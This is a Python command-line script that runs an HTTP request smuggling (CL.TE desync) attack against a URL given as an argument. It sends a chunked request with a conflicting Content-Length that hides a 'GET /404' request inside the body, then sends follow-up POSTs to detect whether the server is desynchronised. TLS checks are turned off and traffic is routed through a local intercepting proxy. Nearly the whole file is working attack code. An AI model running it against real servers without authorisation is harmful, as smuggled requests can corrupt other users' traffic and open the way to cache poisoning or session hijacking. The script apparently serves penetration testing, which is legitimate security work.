import requests
import sys
import urllib3
from urllib3.util import SKIP_HEADER
from collections import OrderedDict

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8082', 'https':'http://127.0.0.1:8082'}

def HTTPRequestSmugglingTesting(url, requesttype, path):
   fullurl = url + path
   headers = OrderedDict({"Cookie": None, "Accept-Language": None, "User-Agent": None,"Dnt": None,"Accept-Encoding": None,
                          "Upgrade-Insecure-Requests": None, "Sec-Fetch-Dest": None, "Sec-Fetch-Mode": None, "Sec-Fetch-Site": None ,
                          "Sec-Fetch-User": None, "Te": None, "Accept": None, "Connection": None, "Content-Type": SKIP_HEADER, "Content-Length": SKIP_HEADER})

   headers.update(OrderedDict([("Content-Length", "34"),("Content-Type", "application/x-www-form-urlencoded"), ("Transfer-Encoding","chunked")]))
   data = {
    'body' : '0\r\nGET /404 HTTP/1.1\r\nX-Ignore: X'
   }

   datan = {
    'foo':'bar'
   }
   headers2 = OrderedDict({"Cookie": None, "Accept-Language": None, "User-Agent": None,"Dnt": None,"Accept-Encoding": None,
                          "Upgrade-Insecure-Requests": None, "Sec-Fetch-Dest": None, "Sec-Fetch-Mode": None, "Sec-Fetch-Site": None ,
                          "Sec-Fetch-User": None, "Te": None, "Accept": None, "Connection": None, "Content-Type": SKIP_HEADER, "Content-Length": SKIP_HEADER})

   headers2.update(OrderedDict([("Content-Length", "9"),("Content-Type", "application/x-www-form-urlencoded")]))


   if (requesttype == "GET"):
    s = requests.Session()
    s.headers = {}
    r = s.get(fullurl, headers=headers, verify=False, proxies=proxies, data=data)
    s.headers = {}
    no = s.post(fullurl, headers=headers2, verify=False, proxies=proxies, data=datan)
    no1 = requests.post(fullurl, headers=headers2, verify=False, proxies=proxies, data=datan)
    print(r)
    print(r.text)
    print(no)
    print(no.text)
    print(no1)
    print(no1.text)

   elif (requesttype == "HEAD"):
    s = requests.Session()
    s.headers = {}
    h = s.head(fullurl, headers=headers, verify=False, proxies=proxies, data=data)
    s.headers = {}
    no = s.post(fullurl, headers=headers2, verify=False, proxies=proxies, data=datan)

    print(no.status_code)

    print(h.status_code)


   elif (requesttype == "POST"):
    s = requests.Session()
    s.headers = {}
    p = s.post(fullurl, headers=headers, verify=False, proxies=proxies, data=data)
    s.headers = {}
    no = s.post(fullurl, headers=headers2, verify=False, proxies=proxies, data=datan)

    print(p.status_code)
    print(no.status_code)


   elif (requesttype == "PUT"):
    s = requests.Session()
    s.headers = {}
    pu = s.put(fullurl, headers=headers, verify=False, proxies=proxies, data=data)
    s.headers = {}
    no = s.post(fullurl, headers=headers2, verify=False, proxies=proxies, data=datan)

    print(pu.status_code)
    print(no.status_code)


   else:
    s = requests.Session()
    s.headers = {}
    de = s.delete(fullurl, headers=headers, verify=False, proxies=proxies, data=data)
    s.headers = {}
    no = s.post(fullurl, headers=headers2, verify=False, proxies=proxies, data=datan)

    print(de.status_code)
    print(no.status_code)




if "__main__" == __name__:
  try:
   print("[+] Help : The positions are <url> <requesttype> <path>")
   print("Methods available are GET HEAD POST PUT DELETE")
   url = sys.argv[1].strip()
   requesttype = sys.argv[2].strip()
   path = sys.argv[3].strip()

  except IndexError:
   print('[+] Usage <url> <requesttype> <path> %s' %sys.argv[0])
   print("[+] Example example.com GET path %s"%sys.argv[0])
   print("Methods available are GET HEAD POST PUT DELETE")
   sys.exit(1)

  HTTPRequestSmugglingTesting(url, requesttype, path)


